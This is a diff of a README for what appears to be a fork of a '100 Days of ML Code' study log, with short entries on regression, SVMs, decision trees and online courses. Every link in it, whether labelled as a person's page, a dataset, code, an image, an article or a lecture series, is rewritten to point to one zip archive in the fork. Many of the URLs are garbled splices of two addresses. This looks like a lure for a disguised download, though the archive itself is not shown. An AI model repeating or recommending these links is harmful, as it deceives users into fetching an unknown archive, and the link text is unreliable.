@@ -1,34 +1,34 @@
 # 100-Days-Of-ML-Code
 
-100 Days of Machine Learning Coding as proposed by [Siraj Raval](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip)
+100 Days of Machine Learning Coding as proposed by [Siraj Raval](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip)
 
-Get the datasets from [here](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip)
+Get the datasets from [here](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip)
 
 ## Data PreProcessing | Day 1
-Check out the code from [here](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%201_Data%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip).
+Check out the code from [here](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%201_Data%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip).
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Simple Linear Regression | Day 2
-Check out the code from [here](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip).
+Check out the code from [here](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip).
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Multiple Linear Regression | Day 3
-Check out the code from [here](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip).
+Check out the code from [here](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip).
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Logistic Regression | Day 4
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Logistic Regression | Day 5
@@ -37,16 +37,16 @@ Due to less time I will now be posting a infographic on alternate days.
 Also if someone wants to help me out in documentaion of code and has already some experince in the field and knows Markdown for github please contact me on LinkedIn :) .
 
 ## Implementing Logistic Regression | Day 6
-Check out the Code [here](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%206%20Logistic%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip)
+Check out the Code [here](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%206%20Logistic%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip)
 
 ## K Nearest Neighbours | Day 7
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Math Behind Logistic Regression | Day 8 
 
-#100DaysOfMLCode To clear my insights on logistic regression I was searching on the internet for some resource or article and I came across this article (https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip) by Saishruthi Swaminathan. 
+#100DaysOfMLCode To clear my insights on logistic regression I was searching on the internet for some resource or article and I came across this article (https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip) by Saishruthi Swaminathan. 
 
 It gives a detailed description of Logistic Regression. Do check it out.
 
@@ -63,7 +63,7 @@ Support Vector Machine Infographic is halfway complete will update it tomorrow.
 
 ## Support Vector Machines | Day 12
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Naive Bayes Classifier | Day 13
@@ -73,10 +73,10 @@ I am also implementing the SVM in python using scikit-learn. Will update the cod
 
 ## Implementation of SVM | Day 14
 Today I implemented SVM on linearly related data. Used Scikit-Learn library. In scikit-learn we have SVC classifier which we use to achieve this task. Will be using kernel-trick on next implementation.
-Check the code [here](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%2013%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip).
+Check the code [here](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%2013%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip).
 
 ## Naive Bayes Classifier and Black Box Machine Learning | Day 15
-Learned about diffrent types of naive bayes classifer also started the lectures by [Bloomberg](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip). first one in the playlist was Black Box Machine Learning. It gave the whole over view about prediction functions, feature extraction, learning algorithms, performance evaluation, cross-validation, sample bias, nonstationarity, overfitting, and hyperparameter tuning.
+Learned about diffrent types of naive bayes classifer also started the lectures by [Bloomberg](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip). first one in the playlist was Black Box Machine Learning. It gave the whole over view about prediction functions, feature extraction, learning algorithms, performance evaluation, cross-validation, sample bias, nonstationarity, overfitting, and hyperparameter tuning.
 
 ## Implemented SVM using Kernel Trick | Day 16
 Using Scikit-Learn library implemented SVM algorithm along with kernel function which maps our data points into higher dimension to find optimal hyperplane. 
@@ -101,16 +101,16 @@ Lecture 2 of 18 of Caltech's Machine Learning Course - CS 156 by Professor Yaser
 
 ## Decision Trees | Day 23
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
 
 ## Introduction To Statistical Learning Theory | Day 24
 Lec 3 of Bloomberg ML course introduced some of the core concepts like input space, action space, outcome space, prediction functions, loss functions, and hypothesis spaces.
 
 ## Implementing Decision Trees | Day 25
-Check the code [here.](https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%2025%20Decision%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip)
+Check the code [here.](https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%2025%20Decision%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip)
 
 ## Random Forests | Day 33
 <p align="center">
-  <img src="https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip%https://raw.githubusercontent.com/kumarsreenivas051/100-Days-Of-ML-Code/master/reluctate/100-Days-Of-ML-Code.zip">
+  <img src="https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip%https://github.com/kumarsreenivas051/100-Days-Of-ML-Code/raw/refs/heads/master/datasets/Days-Code-Of-M-v1.6.zip">
 </p>
